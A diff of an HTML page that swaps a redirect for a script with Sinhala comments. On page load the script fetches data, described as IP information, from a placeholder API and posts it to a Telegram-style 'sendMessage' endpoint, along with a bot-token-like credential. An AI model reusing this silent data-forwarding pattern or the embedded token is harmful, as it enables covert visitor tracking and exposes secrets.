@@ -2,11 +2,37 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="1; url=1.py">
-    <title>Redirecting...</title>
+    <title>API Request Example</title>
 </head>
 <body>
-    <p>Please wait, redirecting...</p>
+    <script>
+        // 1. පළමු API එකෙන් දත්ත ලබා ගැනීම (උදා: IP දත්ත)
+        fetch('https://api.example.com/get-data')
+            .then(response => response.json())
+            .then(data => {
+                
+                // 2. යැවිය යුතු පණිවිඩය සකස් කිරීම
+                const message = `Data: ${data.info}`;
+
+                // 3. දෙවන API එක වෙත දත්ත යැවීම (උදා: Telegram API ආකෘතිය)
+                // සටහන: සංවේදී API Keys මෙලෙස Client-side කේතයේ ලිවීම ආරක්ෂිත නොවේ.
+                const apiUrl = `https://api.thirdparty.com/sendMessage`;
+                
+                fetch(apiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        target_id: "8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI",
+                        text: message
+                    })
+                })
+                .then(res => console.log("Request Sent"))
+                .catch(err => console.error("Error:", err));
+
+            })
+            .catch(error => console.error("Error fetching initial data:", error));
+    </script>
 </body>
 </html>
